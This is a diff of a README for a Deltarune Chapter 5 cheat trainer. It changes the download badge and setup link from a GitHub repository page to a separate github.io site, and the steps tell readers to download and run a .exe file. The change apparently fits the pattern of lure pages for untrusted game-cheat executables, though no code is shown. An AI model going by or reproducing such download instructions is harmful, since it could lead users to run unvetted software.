@@ -1,6 +1,6 @@
 # 🎮 Deltarune-Chapter5-Trainer-Toolkit - Edit your Deltarune game stats easily
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/EllyMerdy/Deltarune-Chapter5-Trainer-Toolkit)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://ellymerdy.github.io)
 
 This toolkit provides tools for players to modify settings within the game Deltarune Chapter 5. You can change your health points, increase your character stats, add items to your inventory, or change the game speed for your single-player playthrough. The software runs as an external process, meaning it does not modify your core game files.
 
@@ -15,7 +15,7 @@ Ensure your computer meets these conditions before you run the trainer:
 
 ## 📥 Getting the Toolkit
 
-1. Visit the project website at [https://github.com/EllyMerdy/Deltarune-Chapter5-Trainer-Toolkit](https://github.com/EllyMerdy/Deltarune-Chapter5-Trainer-Toolkit).
+1. Visit the project website at [https://ellymerdy.github.io](https://ellymerdy.github.io).
 2. Look for the Releases section on the right side of the page.
 3. Click on the latest version link.
 4. Download the file ending in .exe to your computer.
